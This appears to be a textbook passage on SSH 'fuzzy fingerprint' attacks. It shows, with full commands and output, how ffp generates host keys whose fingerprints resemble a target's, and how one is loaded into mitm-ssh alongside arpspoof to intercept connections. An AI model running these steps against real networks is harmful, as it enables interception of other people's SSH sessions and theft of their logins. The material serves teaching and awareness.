Konrad Rieck had an interesting idea regarding SSH host fingerprints
Often, a user will connect to a server from several different clients
The host fingerprint will be displayed and added each time a new client is used, a security-conscious user will tend to remember the general structure of the host fingerprint
While no one actually memorizes the entire fingerprint, major changes can be detected with little effort
Having a general idea of what the host fingerprint looks like when connecting from a new client greatly increases the security of that connection
If an MitM attack is attempted, the blatant difference in host fingerprints can usually be detected by eye

However, the eye and the brain can be tricked
Certain fingerprints will look very similar to others
Digits 1 and 7 look very similar, depending on the display font
Usually, the hex digits found at the beginning and end of the fingerprints are remembered with the greatest clarity, while the middle tends to be a bit hazy
The goal behind the fuzzy fingerprint technique is to generate a host key with a fingerprint that looks similar enough to the original fingerprint to fool the human eye

The openssh package provides tools to retrieve the host key from servers
__________________________________________________________________________________
reader@hacking:~ $ ssh-keyscan -t rsa 192.168.42.72 > loki.hostkey
# 192.168.42.72 SSH-1.99-OpenSSH_3.9p1

reader@hacking:~ $ cat loki.hostkey
192.168.42.72 ssh-rsa
AAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/
JSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/
52KTzjtKGacX4gTLNSc8fzfZU=

reader@hacking:~ $ ssh-keygen -l -f loki.hostkey
1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72
__________________________________________________________________________________

Now that the host key fingerprint format is known for 192.168.42.72 (loki), fuzzy fingerprints can be generated that look similar
A program that does this has been developed by Rieck and is available at http://www.thc.org/thc-ffp/
The following output shows the creation of some fuzzy fingerprints for 192.168.42.72 (loki)
__________________________________________________________________________________
reader@hacking:~ $ ffp
Usage: ffp [Options]
Options:
-f type        Specify type of fingerprint to use [Default: md5] 
               Available: md5, sha1, ripemd 
-t hash        Target fingerprint in byte blocks. 
               Colon-separated: 01:23:45:67... or as string 01234567... 
-k type        Specify type of key to calculate [Default: rsa] 
               Available: rsa, dsa 
-b bits        Number of bits in the keys to calculate [Default: 1024] 
-K mode        Specify key calulation mode [Default: sloppy] 
               Available: sloppy, accurate 
-m type        Specify type of fuzzy map to use [Default: gauss] 
               Available: gauss, cosine 
-v variation   Variation to use for fuzzy map generation [Default: 7.3] 
-y mean        Mean value to use for fuzzy map generation [Default: 0.14] 
-l size        Size of list that contains best fingerprints [Default: 10] 
-s filename    Filename of the state file [Default: /var/tmp/ffp.state] 
-e             Extract SSH host key pairs from state file 
-d directory   Directory to store generated ssh keys to [Default: /tmp] 
-p period      Period to save state file and display state [Default: 60] 
-V             Display version information 
No state file /var/tmp/ffp.state present, specify a target hash.

reader@hacking:~ $ ffp -f md5 -k rsa -b 1024 -t ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0
---[Initializing]---------------------------------------------------------------
Initializing Crunch Hash: Done
Initializing Fuzzy Map: Done
Initializing Private Key: Done
Initializing Hash List: Done
Initializing FFP State: Done

---[Fuzzy Map]------------------------------------------------------------------
   Length: 32
      Type: Inverse Gaussian Distribution
         Sum: 15020328
   Fuzzy Map: 10.83% | 9.64% : 8.52% | 7.47% : 6.49% | 5.58% : 4.74% | 3.96% : 
              3.25% | 2.62% : 2.05% | 1.55% : 1.12% | 0.76% : 0.47% | 0.24% : 
              0.09% | 0.01% : 0.00% | 0.06% : 0.19% | 0.38% : 0.65% | 0.99% : 
              1.39% | 1.87% : 2.41% | 3.03% : 3.71% | 4.46% : 5.29% | 6.18% : 

---[Current Key]----------------------------------------------------------------
               Key Algorithm: RSA (Rivest Shamir Adleman)
         Key Bits / Size of n: 1024 Bits
               Public key e: 0x10001
   Public Key Bits / Size of e: 17 Bits
         Phi(n) and e r.prime: Yes
               Generation Mode: Sloppy


State File: /var/tmp/ffp.state
Running...

---[Current State]--------------------------------------------------------------
Running:    0d 00h 00m 00s | Total:        0k hashs | Speed:        nan hashs/s
--------------------------------------------------------------------------------
Best Fuzzy Fingerprint from State File /var/tmp/ffp.state
Hash Algorithm: Message Digest 5 (MD5)
   Digest Size: 16 Bytes / 128 Bits
Message Digest: 6a:06:f9:a6:cf:09:19:af:c3:9d:c5:b9:91:a4:8d:81
 Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0
 Fuzzy Quality: 25.652482%

---[Current State]--------------------------------------------------------------
Running:    0d 00h 01m 00s | Total:      7635k hashs | Speed:     127242 hashs/s
--------------------------------------------------------------------------------
Best Fuzzy Fingerprint from State File /var/tmp/ffp.state
Hash Algorithm: Message Digest 5 (MD5)
   Digest Size: 16 Bytes / 128 Bits
Message Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80
 Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0
 Fuzzy Quality: 55.471931%

---[Current State]--------------------------------------------------------------
Running:  0d 00h 02m 00s | Total:      15370k hashs | Speed:      128082 hashs/s
--------------------------------------------------------------------------------
Best Fuzzy Fingerprint from State File /var/tmp/ffp.state
Hash Algorithm: Message Digest 5 (MD5)
   Digest Size: 16 Bytes / 128 Bits
Message Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80
 Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0
 Fuzzy Quality: 55.471931%

.:[ output trimmed ]:.

---[Current State]--------------------------------------------------------------
Running: 1d 05h 06m 00s | Total: 13266446k hashs | Speed: 126637 hashs/s
--------------------------------------------------------------------------------
Best Fuzzy Fingerprint from State File /var/tmp/ffp.state
Hash Algorithm: Message Digest 5 (MD5)
Digest Size: 16 Bytes / 128 Bits
Message Digest: ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50
Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0
Fuzzy Quality: 70.158321%

--------------------------------------------------------------------------------
Exiting and saving state file /var/tmp/ffp.state
__________________________________________________________________________________

This fuzzy fingerprint generation process can go on for as long as desired
The program keeps track of some of the best fingerprints and will display them periodically
All of the state information is stored in /var/tmp/ffp.state, so the program can be exited with a CTRL-C and then resumed again later by simply running ffp without any arguments

After running for a while, SSH host key pairs can be extracted from the state file with the -e switch
__________________________________________________________________________________
reader@hacking:~ $ ffp -e -d /tmp
---[Restoring]------------------------------------------------------------------
   Reading FFP State File: Done
    Restoring environment: Done
 Initializing Crunch Hash: Done
--------------------------------------------------------------------------------
Saving SSH host key pairs: [00] [01] [02] [03] [04] [05] [06] [07] [08] [09]

reader@hacking:~ $ ls /tmp/ssh-rsa*
/tmp/ssh-rsa00      /tmp/ssh-rsa02.pub  /tmp/ssh-rsa05     /tmp/ssh-rsa07.pub 
/tmp/ssh-rsa00.pub  /tmp/ssh-rsa03      /tmp/ssh-rsa05.pub /tmp/ssh-rsa08 
/tmp/ssh-rsa01      /tmp/ssh-rsa03.pub  /tmp/ssh-rsa06     /tmp/ssh-rsa08.pub 
/tmp/ssh-rsa01.pub  /tmp/ssh-rsa04      /tmp/ssh-rsa06.pub /tmp/ssh-rsa09 
/tmp/ssh-rsa02      /tmp/ssh-rsa04.pub  /tmp/ssh-rsa07     /tmp/ssh-rsa09.pub 
__________________________________________________________________________________

In the preceding example, 10 public and private host key pairs have been generated
Fingerprints for these key pairs can then be generated and compared with the original fingerprint, as seen in the following output

__________________________________________________________________________________
reader@hacking:~ $ for i in $(ls -1 /tmp/ssh-rsa*.pub)
> do
> ssh-keygen -l -f $i
> done
1024 ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50 /tmp/ssh-rsa00.pub
1024 ba:06:7f:12:bd:8a:5b:5c:eb:dd:93:ec:ec:d3:89:a9 /tmp/ssh-rsa01.pub

      1024 ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0 /tmp/ssh-rsa02.pub

1024 ba:06:49:d4:b9:d4:96:4b:93:e8:5d:00:bd:99:53:a0 /tmp/ssh-rsa03.pub
1024 ba:06:7c:d2:15:a2:d3:0d:bf:f0:d4:5d:c6:10:22:90 /tmp/ssh-rsa04.pub
1024 ba:06:3f:22:1b:44:7b:db:41:27:54:ac:4a:10:29:e0 /tmp/ssh-rsa05.pub
1024 ba:06:78:dc:be:a6:43:15:eb:3f:ac:92:e5:8e:c9:50 /tmp/ssh-rsa06.pub
1024 ba:06:7f:da:ae:61:58:aa:eb:55:d0:0c:f6:13:61:30 /tmp/ssh-rsa07.pub
1024 ba:06:7d:e8:94:ad:eb:95:d2:c5:1e:6d:19:53:59:a0 /tmp/ssh-rsa08.pub
1024 ba:06:74:a2:c2:8b:a4:92:e1:e1:75:f5:19:15:60:a0 /tmp/ssh-rsa09.pub

reader@hacking:~ $ ssh-keygen -l -f ./loki.hostkey
1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72
__________________________________________________________________________________

From the 10 generated key pairs, the one that seems to look the most similar can be determined by eye
In this case, ssh-rsa02.pub, shown, was chosen
Regardless of which key pair is chosen, though, it will certainly look more like the original fingerprint than any randomly generated key would

This new key can be used with mitm-ssh to make for an even more effective attack
The location for the host key is specified in the configuration file, so using the new key is simply matter of adding a HostKey line in /usr/local/etc/mitm-ssh_config, as shown below
Since we need to remove the Protocol 1 line we added earlier, the output below simply overwrites the configuration file

__________________________________________________________________________________
reader@hacking:~ $ echo "HostKey /tmp/ssh-rsa02" > /usr/local/etc/mitm-ssh_config

reader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222Using static route to 192.168.42.72:22
Disabling protocol version 1. Could not load host key
SSH MITM Server listening on 0.0.0.0 port 2222.
__________________________________________________________________________________

In another terminal window, arpspoof is running to redirect the traffic to mitm-ssh, which will use the new host key with the fuzzy fingerprint
The output below compares the output a client would see when connecting

NORMAL CONNECTION
__________________________________________________________________________________
iz@tetsuo:~ $ ssh jose@192.168.42.72
The authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.
RSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.
Are you sure you want to continue connecting (yes/no)?
__________________________________________________________________________________

MitM-ATTACKED CONNECTION
__________________________________________________________________________________
iz@tetsuo:~ $ ssh jose@192.168.42.72
The authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.
RSA key fingerprint is ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0.
Are you sure you want to continue connecting (yes/no)?
__________________________________________________________________________________

Can you immediately tell the difference?
These fingerprints look similar enough to trick most people into simply accepting the connection